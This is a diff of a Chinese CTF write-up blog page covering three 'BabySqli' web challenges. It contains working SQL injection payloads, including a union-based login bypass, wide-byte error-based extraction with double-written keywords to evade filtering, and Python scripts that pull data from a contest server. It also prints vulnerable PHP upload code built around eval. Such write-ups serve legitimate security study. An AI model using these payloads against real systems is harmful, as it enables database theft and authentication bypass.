@@ -17,8 +17,11 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png">
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/3.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/4.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/5.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/6.png">
 <meta property="article:published_time" content="2020-02-04T06:19:53.000Z">
-<meta property="article:modified_time" content="2020-02-04T12:48:36.708Z">
+<meta property="article:modified_time" content="2020-02-04T12:57:04.198Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -201,175 +204,70 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or、&#x3D;、(、）、order、floor</span><br></pre></td></tr></table></figure>
 
 <p>测字段数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3#</span><br><span class="line">admin&#39; union select 1,2,3,4#</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">对比差异可以判断字段数为3</span><br><span class="line">因为密码是做了md5,所以可以构造联合查询来伪造出密码，最终payload 如下</span><br></pre></td></tr></table></figure>
-<p>name=’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 说明：202cb962ac59075b964b07152d234b70&#x3D;md5(123)</span><br><span class="line"></span><br><span class="line">得到flag</span><br><span class="line"></span><br><span class="line">### 代码参考</span><br></pre></td></tr></table></figure>
-<?php
-if($_POST["user"] && $_POST["pass"]) {
-    $mysqli = new mysqli("localhost", "root", "2wsx3edctf", "challenges");  
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3#</span><br><span class="line">admin&#39; union select 1,2,3,4#</span><br></pre></td></tr></table></figure>
 
-    $user = $_POST["user"];
-    $pass = md5($_POST["pass"]);
-    $sql = "select pwd from interest where uname='$user'";
-    $result = $mysqli->query($sql);  
-    $row = $result->fetch_assoc();
-    //echo $row["pwd"];
-    if (($row["pwd"]) && (!strcasecmp($pass, $row["pwd"]))) {
-        echo "<p>Logged in! Key:flag{xiaohdaldahdkajsdhja} </p>";
-    }
-    else {
-        echo("<p>Log in failure!</p>");
-    }
-    $result->free(); 
-    $mysqli->close();  
-}
-else{
+<p>对比差异可以判断字段数为3<br>因为密码是做了md5,所以可以构造联合查询来伪造出密码，最终payload 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw&#x3D;123</span><br></pre></td></tr></table></figure>
 
-    echo "nonono";
-}
-?>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## BabySqli2.0</span><br><span class="line"></span><br><span class="line">### 题目说明</span><br></pre></td></tr></table></figure>
-<p>我对网站进行了加固，还支持了中文账号，这下你们没辙了吧？</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">鲁迅说过，一提到中文，马上想到gbk,马上想到宽字节注入</span><br></pre></td></tr></table></figure>
-<p>admin’ 提示没有此用户<br>admin%df’ 数据库报错,说明确实是宽字节注入，然后开始报错注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### waf探测</span><br><span class="line"></span><br><span class="line">查表名时出现了极其奇怪的情况，后来发现是对关键词进行了过滤，而查询数据库名时，extractvalue()即使没有select,也可以查出来数据库名，日，于是先fuzz一波关键词，以后要记得先探测waf，发现至少有以下关键词被过滤,但双写可以绕过</span><br></pre></td></tr></table></figure>
-<p>union select where</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### 注数据库名</span><br></pre></td></tr></table></figure>
-<p>1%df’ and extractvalue(1,concat(1,(seselectlect database()),1))%23    </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到web_sqli</span><br><span class="line"></span><br><span class="line">### 注表名</span><br></pre></td></tr></table></figure>
-<p>1%df’ and extractvalue(1,concat(1,(seselectlect  group_concat(table_name) from information_schema.tables whwhereere table_schema=database()),1))%23</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到f14g,user</span><br><span class="line"></span><br><span class="line">### 查询字段</span><br><span class="line"></span><br><span class="line">这里table_name&#x3D;&#39;f14g&#39;,但是引号被转义了，尝试使用0x也被waf了，这里采用char编码绕过</span><br></pre></td></tr></table></figure>
-<p>1%df’ and extractvalue(1,concat(1,(seselectlect  group_concat(column_name) from information_schema.columns whwhereere table_name=char(102,49,52,103)),1))%23</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到b80bb7740288fda1f201890375a60c8f,md5(解密为id)</span><br><span class="line"></span><br><span class="line">### 查询字段</span><br></pre></td></tr></table></figure>
-<p>1%df’ and extractvalue(1,concat(1,(seselectlect  group_concat(b80bb7740288fda1f201890375a60c8f) from f14g),1))%23</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现确实是id,然后查md5(flag)试试</span><br></pre></td></tr></table></figure>
-<p>1%df%27 and extractvalue(1,concat(1,(seselectlect  group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g),1))%23</p>
-<p>\1%df%27 and extractvalue(1,concat(1,(seselectlect  group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 1,1),1))%23&amp;pw=2</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr</span><br><span class="line"></span><br><span class="line">这里说一个地方，为什么flag字段没查出来，因为group_concat()好像只能读出长度32位，所以读出第一个hash后就没能显示出第二个hash</span><br><span class="line"></span><br><span class="line">base64为The first man name was k</span><br><span class="line">？？？？</span><br><span class="line">通过limit 全查出来试试,直接用python脚本</span><br></pre></td></tr></table></figure>
-<p>import requests<br>import base64<br>import re<br>import re<br>rule = re.compile(r”Error: XPATH syntax error: &#39;.*&#39;“)<br>i=0<br>for i in range(0,100):<br>    url=”<a href="http://183.129.189.60:10008/search.php?name=1%df%27" target="_blank" rel="noopener">http://183.129.189.60:10008/search.php?name=1%df%27</a> and extractvalue(1,concat(1,(seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit “+str(i)+”,1),1))%23&amp;pw=2”<br>    url=url.replace(‘ ‘,’%20’)<br>    # print(url)<br>    s=requests.get(url).text<br>    result=rule.findall(s)[0].replace(“Error: XPATH syntax error: “,””).replace(‘&#39;‘,’’)<br>    # print(result)<br>    try:<br>        print(i,base64.b64decode(result))<br>    except:<br>        print(result)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在第22列发现flag，但是只有一半</span><br><span class="line"></span><br><span class="line">![](安恒杯新春祈福赛&#x2F;4.png)</span><br><span class="line"></span><br><span class="line">借助substr读出来就好了</span><br></pre></td></tr></table></figure>
-<p>import requests<br>import base64<br>import re<br>rule = re.compile(r”Error: XPATH syntax error: &#39;.*&#39;“)<br>url=”<a href="http://183.129.189.60:10008/search.php?name=1%df%27" target="_blank" rel="noopener">http://183.129.189.60:10008/search.php?name=1%df%27</a> and extractvalue(1,concat(1,substr((seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1,32),1))%23&amp;pw=2”<br>url=url.replace(‘ ‘,’%20’)<br>s=requests.get(url).text<br>result=rule.findall(s)[0].replace(“Error: XPATH syntax error: “,””).replace(‘&#39;‘,’’)<br>flag=result<br>url=”<a href="http://183.129.189.60:10008/search.php?name=1%df%27" target="_blank" rel="noopener">http://183.129.189.60:10008/search.php?name=1%df%27</a> and extractvalue(1,concat(1,substr((seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),33,32),1))%23&amp;pw=2”<br>url=url.replace(‘ ‘,’%20’)<br>s=requests.get(url).text<br>result=rule.findall(s)[0].replace(“Error: XPATH syntax error: “,””).replace(‘&#39;‘,’’)<br>flag=flag+result<br>print(base64.b64decode(flag))</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## Babysqliv3.0</span><br><span class="line">题目说明</span><br></pre></td></tr></table></figure>
-<p>这次我可是绝对防御！</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首页登录界面</span><br><span class="line">admin和password登录即可，</span><br><span class="line">自动设置session后跳转到一个上传页面</span><br><span class="line">### 预期解法</span><br><span class="line">观察到存在GET参数?file&#x3D;upload,文件包含明细标志，尝试读取源代码</span><br><span class="line"></span><br><span class="line">upload.php</span><br></pre></td></tr></table></figure>
-<?php
-error_reporting(0);
-class Uploader{
-    public $Filename;
-    public $cmd;
-    public $token;
+<ul>
+<li>说明：202cb962ac59075b964b07152d234b70=md5(123)</li>
+</ul>
+<p>得到flag</p>
+<h3 id="代码参考"><a href="#代码参考" class="headerlink" title="代码参考"></a>代码参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[&quot;user&quot;] &amp;&amp; $_POST[&quot;pass&quot;]) &#123;</span><br><span class="line">	$mysqli &#x3D; new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;2wsx3edctf&quot;, &quot;challenges&quot;);  </span><br><span class="line">    </span><br><span class="line">    $user &#x3D; $_POST[&quot;user&quot;];</span><br><span class="line">    $pass &#x3D; md5($_POST[&quot;pass&quot;]);</span><br><span class="line">    $sql &#x3D; &quot;select pwd from interest where uname&#x3D;&#39;$user&#39;&quot;;</span><br><span class="line">    $result &#x3D; $mysqli-&gt;query($sql);  </span><br><span class="line">    $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">    &#x2F;&#x2F;echo $row[&quot;pwd&quot;];</span><br><span class="line">    if (($row[&quot;pwd&quot;]) &amp;&amp; (!strcasecmp($pass, $row[&quot;pwd&quot;]))) &#123;</span><br><span class="line">        echo &quot;&lt;p&gt;Logged in! Key:flag&#123;xiaohdaldahdkajsdhja&#125; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo(&quot;&lt;p&gt;Log in failure!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">	$result-&gt;free(); </span><br><span class="line">	$mysqli-&gt;close();  </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;nonono&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<h2 id="BabySqli2-0"><a href="#BabySqli2-0" class="headerlink" title="BabySqli2.0"></a>BabySqli2.0</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我对网站进行了加固，还支持了中文账号，这下你们没辙了吧？</span><br></pre></td></tr></table></figure>
 
-    function __construct(){
-        $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
-        $ext = ".txt";
-        @mkdir($sandbox, 0777, true);
-        if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
-            $this->Filename = $_GET['name'];
-        }
-        else{
-            $this->Filename = $sandbox.$_SESSION['user'].$ext;
-        }
+<p>鲁迅说过，一提到中文，马上想到gbk,马上想到宽字节注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; 提示没有此用户</span><br><span class="line">admin%df&#39; 数据库报错,说明确实是宽字节注入，然后开始报错注入</span><br></pre></td></tr></table></figure>
 
-        $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
-        $this->token = $_SESSION['user'];
-    }
+<h3 id="waf探测"><a href="#waf探测" class="headerlink" title="waf探测"></a>waf探测</h3><p>查表名时出现了极其奇怪的情况，后来发现是对关键词进行了过滤，而查询数据库名时，extractvalue()即使没有select,也可以查出来数据库名，日，于是先fuzz一波关键词，以后要记得先探测waf，发现至少有以下关键词被过滤,但双写可以绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select where</span><br></pre></td></tr></table></figure>
+<h3 id="注数据库名"><a href="#注数据库名" class="headerlink" title="注数据库名"></a>注数据库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#39; and extractvalue(1,concat(1,(seselectlect database()),1))%23</span><br></pre></td></tr></table></figure>
 
-    function upload($file){
-        global $sandbox;
-        global $ext;
+<p>得到web_sqli</p>
+<h3 id="注表名"><a href="#注表名" class="headerlink" title="注表名"></a>注表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#39; and extractvalue(1,concat(1,(seselectlect  group_concat(table_name) from information_schema.tables whwhereere table_schema&#x3D;database()),1))%23</span><br></pre></td></tr></table></figure>
 
-        if(preg_match("[^a-z0-9]", $this->Filename)){
-            $this->cmd = "die('illegal filename!');";
-        }
-        else{
-            if($file['size'] > 1024){
-                $this->cmd = "die('you are too big (â²â½`ã)');";
-            }
-            else{
-                $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
-            }
-        }
-    }
+<p>得到f14g,user</p>
+<h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><p>这里table_name=’f14g’,但是引号被转义了，尝试使用0x也被waf了，这里采用char编码绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#39; and extractvalue(1,concat(1,(seselectlect  group_concat(column_name) from information_schema.columns whwhereere table_name&#x3D;char(102,49,52,103)),1))%23</span><br></pre></td></tr></table></figure>
 
-    function __toString(){
-        global $sandbox;
-        global $ext;
-        // return $sandbox.$this->Filename.$ext;
-        return $this->Filename;
-    }
+<p>得到b80bb7740288fda1f201890375a60c8f,md5(解密为id)</p>
+<h3 id="查询字段-1"><a href="#查询字段-1" class="headerlink" title="查询字段"></a>查询字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#39; and extractvalue(1,concat(1,(seselectlect  group_concat(b80bb7740288fda1f201890375a60c8f) from f14g),1))%23</span><br></pre></td></tr></table></figure>
 
-    function __destruct(){
-        if($this->token != $_SESSION['user']){
-            $this->cmd = "die('check token falied!');";
-        }
-        eval($this->cmd);
-    }
-}
+<p>发现确实是id,然后查md5(flag)试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1%df%27 and extractvalue(1,concat(1,(seselectlect  group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g),1))%23</span><br><span class="line"></span><br><span class="line">\1%df%27 and extractvalue(1,concat(1,(seselectlect  group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 1,1),1))%23&amp;pw&#x3D;2</span><br></pre></td></tr></table></figure>
 
-if(isset($_FILES['file'])) {
-    $uploader = new Uploader();
-    $uploader->upload($_FILES["file"]);
-    if(@file_get_contents($uploader)){
-        echo "ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼<br>".$uploader."<br>";
-        echo file_get_contents($uploader);
-    }
-}
+<p>得到VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr</p>
+<p>这里说一个地方，为什么flag字段没查出来，因为group_concat()好像只能读出长度32位，所以读出第一个hash后就没能显示出第二个hash</p>
+<p>base64为The first man name was k<br>？？？？<br>通过limit 全查出来试试,直接用python脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">import re</span><br><span class="line">rule &#x3D; re.compile(r&quot;Error: XPATH syntax error: \&#39;.*\&#39;&quot;)</span><br><span class="line">i&#x3D;0</span><br><span class="line">for i in range(0,100):</span><br><span class="line">    url&#x3D;&quot;http:&#x2F;&#x2F;183.129.189.60:10008&#x2F;search.php?name&#x3D;1%df%27 and extractvalue(1,concat(1,(seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit &quot;+str(i)+&quot;,1),1))%23&amp;pw&#x3D;2&quot;</span><br><span class="line">    url&#x3D;url.replace(&#39; &#39;,&#39;%20&#39;)</span><br><span class="line">    # print(url)</span><br><span class="line">    s&#x3D;requests.get(url).text</span><br><span class="line">    result&#x3D;rule.findall(s)[0].replace(&quot;Error: XPATH syntax error: &quot;,&quot;&quot;).replace(&#39;\&#39;&#39;,&#39;&#39;)</span><br><span class="line">    # print(result)</span><br><span class="line">    try:</span><br><span class="line">        print(i,base64.b64decode(result))</span><br><span class="line">    except:</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>
+<p>在第22列发现flag，但是只有一半</p>
+<p><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/4.png" alt></p>
+<p>借助substr读出来就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">rule &#x3D; re.compile(r&quot;Error: XPATH syntax error: \&#39;.*\&#39;&quot;)</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;183.129.189.60:10008&#x2F;search.php?name&#x3D;1%df%27 and extractvalue(1,concat(1,substr((seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1,32),1))%23&amp;pw&#x3D;2&quot;</span><br><span class="line">url&#x3D;url.replace(&#39; &#39;,&#39;%20&#39;)</span><br><span class="line">s&#x3D;requests.get(url).text</span><br><span class="line">result&#x3D;rule.findall(s)[0].replace(&quot;Error: XPATH syntax error: &quot;,&quot;&quot;).replace(&#39;\&#39;&#39;,&#39;&#39;)</span><br><span class="line">flag&#x3D;result</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;183.129.189.60:10008&#x2F;search.php?name&#x3D;1%df%27 and extractvalue(1,concat(1,substr((seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),33,32),1))%23&amp;pw&#x3D;2&quot;</span><br><span class="line">url&#x3D;url.replace(&#39; &#39;,&#39;%20&#39;)</span><br><span class="line">s&#x3D;requests.get(url).text</span><br><span class="line">result&#x3D;rule.findall(s)[0].replace(&quot;Error: XPATH syntax error: &quot;,&quot;&quot;).replace(&#39;\&#39;&#39;,&#39;&#39;)</span><br><span class="line">flag&#x3D;flag+result</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
 
-?>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home.php</span><br></pre></td></tr></table></figure>
-<?php
-session_start();
-echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
-error_reporting(0);
-if(isset($_SESSION['user'])){
-    if(isset($_GET['file'])){
-        if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
-            die("hacker!");
-        }
-        else{
-            if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
-                $file = $_GET['file'].".php";
-            }
-            else{
-                $file = $_GET['file'].".fxxkyou!";
-            }
-            echo "å½åå¼ç¨çæ¯ ".$file;
-            require $file;
-        }
+<h2 id="Babysqliv3-0"><a href="#Babysqliv3-0" class="headerlink" title="Babysqliv3.0"></a>Babysqliv3.0</h2><p>题目说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次我可是绝对防御！</span><br></pre></td></tr></table></figure>
+<p>首页登录界面<br>admin和password登录即可，<br>自动设置session后跳转到一个上传页面</p>
+<h3 id="预期解法"><a href="#预期解法" class="headerlink" title="预期解法"></a>预期解法</h3><p>观察到存在GET参数?file=upload,文件包含明细标志，尝试读取源代码</p>
+<p>upload.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">		$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">		@mkdir($sandbox, 0777, true);</span><br><span class="line">		if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">		$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function upload($file)&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line"></span><br><span class="line">		if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (â²â½&#96;ã)&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString()&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line">		&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">		return $this-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		eval($this-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">	$uploader &#x3D; new Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">	if(@file_get_contents($uploader))&#123;</span><br><span class="line">		echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo 